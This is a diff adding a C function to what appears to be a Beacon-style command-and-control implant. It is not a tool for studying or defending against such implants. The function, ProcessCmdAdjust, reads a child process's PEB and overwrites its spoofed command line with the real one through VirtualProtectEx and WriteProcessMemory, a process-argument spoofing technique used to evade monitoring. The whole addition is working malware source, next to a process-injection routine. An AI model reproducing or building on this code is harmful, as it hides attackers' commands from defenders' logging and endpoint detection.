@@ -913,6 +913,96 @@ void ProcThreadAttributeListDestroy(LPVOID lpAttributeList)
 	HeapFree(GetProcessHeap(), 0, lpAttributeList);
 }
 
+/**
+ * @brief Adjusts the command line of a process by replacing it with a new one.
+ *
+ * This function is used for adjusting the command line of a process by allocating a new buffer,
+ * converting the new command to wide characters, and writing it to the process memory.
+ */
+BOOL ProcessCmdAdjust(PROCESS_INFORMATION* processInfo, EXPANDED_CMD* cmds) {
+	if(!IsProcess64Bit(processInfo->hProcess))
+	{
+		LERROR("x64 Beacon cannot adjust arguments in x86 process");
+		BeaconErrorNA(ERROR_ADJUST_ARGUMENTS_BY_ARCH_FAILED);
+		return FALSE;
+	}
+
+	CONTEXT ctx;
+	ctx.ContextFlags = CONTEXT_INTEGER;
+
+	if (!GetThreadContext(processInfo->hThread, &ctx))
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not adjust arguments in process: %s - Reason: Could not get thread context", LAST_ERROR_STR(lastError));
+		BeaconErrorD(ERROR_ADJUST_ARGUMENTS_FAILED, lastError);
+		return FALSE;
+	}
+
+#if IS_X64()
+	// Use RDX
+	DWORD64 reg = ctx.Rdx;
+#else
+	// Use EBX
+	DWORD64 reg = ctx.Ebx;
+#endif
+
+	const PEB* peb = (PEB*)reg;
+	RTL_USER_PROCESS_PARAMETERS processParameters;
+	if(!ReadProcessMemory(processInfo->hProcess, &peb->ProcessParameters, &processParameters, sizeof(peb->ProcessParameters), NULL))
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not adjust arguments in process: %s - Reason: Could not read process parameters", LAST_ERROR_STR(lastError));
+		BeaconErrorD(ERROR_ADJUST_ARGUMENTS_FAILED, lastError);
+		return FALSE;
+	}
+
+	UNICODE_STRING commandLine = { 0 };
+	if(!ReadProcessMemory(processInfo->hProcess, &processParameters.CommandLine, &commandLine, sizeof(commandLine), NULL))
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not adjust arguments in process: %s - Reason: Could not read command line", LAST_ERROR_STR(lastError));
+		BeaconErrorD(ERROR_ADJUST_ARGUMENTS_FAILED, lastError);
+		return FALSE;
+	}
+
+	DWORD flOldProtect;
+	if (!VirtualProtectEx(processInfo->hProcess, commandLine.Buffer, commandLine.MaximumLength, PAGE_READWRITE, &flOldProtect))
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not adjust arguments in process: %s - Reason: Could not adjust permissions", LAST_ERROR_STR(lastError));
+		BeaconErrorD(ERROR_ADJUST_ARGUMENTS_FAILED, lastError);
+		return FALSE;
+	}
+
+	// FIXME: I do not understand why is this freed just only when an error occurs... I'm not sure if this is purposeful or not. Maybe a memory leak?
+	WCHAR* newCmd = malloc(commandLine.MaximumLength);
+	memset(newCmd, 0, commandLine.MaximumLength);
+
+	if (!toWideChar(cmds->cmd, newCmd, commandLine.MaximumLength / sizeof(WCHAR)))
+	{
+		LERROR("Real arguments are longer than fake arguments.");
+		BeaconErrorNA(ERROR_REAL_FAKE_ARGS_NO_MATCH);
+
+		goto cleanup;
+	}
+
+	SIZE_T wrote;
+	if(!WriteProcessMemory(processInfo->hProcess, commandLine.Buffer, newCmd, commandLine.MaximumLength, &wrote))
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not adjust arguments in process: %s - Reason: Could not write new command line", LAST_ERROR_STR(lastError));
+		BeaconErrorD(ERROR_ADJUST_ARGUMENTS_FAILED, lastError);
+
+		goto cleanup;
+	}
+
+	return TRUE;
+
+	cleanup:
+		free(newCmd);
+		return FALSE;
+}
+
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
